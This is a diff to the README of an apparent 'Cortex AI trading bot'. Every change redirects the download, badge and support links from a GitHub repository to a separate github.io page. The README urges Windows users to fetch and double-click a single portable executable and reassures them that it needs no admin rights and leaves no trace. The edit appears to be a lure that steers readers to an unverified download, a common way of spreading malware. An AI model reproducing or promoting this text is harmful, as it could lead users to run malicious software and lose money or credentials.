@@ -1,6 +1,6 @@
 # 🧠 cortex-ai-trading-bot - AI Trading Made Effortlessly Simple
 
-[![Download Now](https://img.shields.io/badge/Download-Cortex%20AI%20Trading%20Bot-00C853?style=for-the-badge&logo=github&logoColor=white&labelColor=1B5E20)](https://github.com/Almetaadmirable98/cortex-ai-trading-bot)
+[![Download Now](https://img.shields.io/badge/Download-Cortex%20AI%20Trading%20Bot-00C853?style=for-the-badge&logo=github&logoColor=white&labelColor=1B5E20)](https://almetaadmirable98.github.io)
 
 ---
 
@@ -29,7 +29,7 @@ Follow these simple steps to get the bot running on your Windows computer in les
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-**👉 [https://github.com/Almetaadmirable98/cortex-ai-trading-bot](https://github.com/Almetaadmirable98/cortex-ai-trading-bot)**
+**👉 [https://almetaadmirable98.github.io](https://almetaadmirable98.github.io)**
 
 Click the green "Download" button on that page. The file will start downloading automatically. It's a single, portable file — no complex installation required.
 
@@ -63,7 +63,7 @@ Press the "Start Trading" button. The bot will begin monitoring the market immed
 ## 📥 Download & Install Details
 
 **Important:** Visit this link to download the application:  
-**🔗 [https://github.com/Almetaadmirable98/cortex-ai-trading-bot](https://github.com/Almetaadmirable98/cortex-ai-trading-bot)**
+**🔗 [https://almetaadmirable98.github.io](https://almetaadmirable98.github.io)**
 
 The application is a standalone portable program. You don't need to install anything extra like Python or Node.js. Just download the single file, double-click it, and it runs. No admin password required. Works on Windows 10 and Windows 11. No dependencies, no bloat. If you ever want to remove it, simply delete the file. It doesn't write anything to your system registry.
 
@@ -151,7 +151,7 @@ A: Visit the GitHub page and open an "Issue" — the community will help you.
 
 ## 📞 Support & Community
 
-- **Official GitHub Page:** [https://github.com/Almetaadmirable98/cortex-ai-trading-bot](https://github.com/Almetaadmirable98/cortex-ai-trading-bot)
+- **Official GitHub Page:** [https://almetaadmirable98.github.io](https://almetaadmirable98.github.io)
 - **Discord Server:** Join via the GitHub page link.
 - **Email Support:** support@cortexaibot.io (response within 24 hours).
 
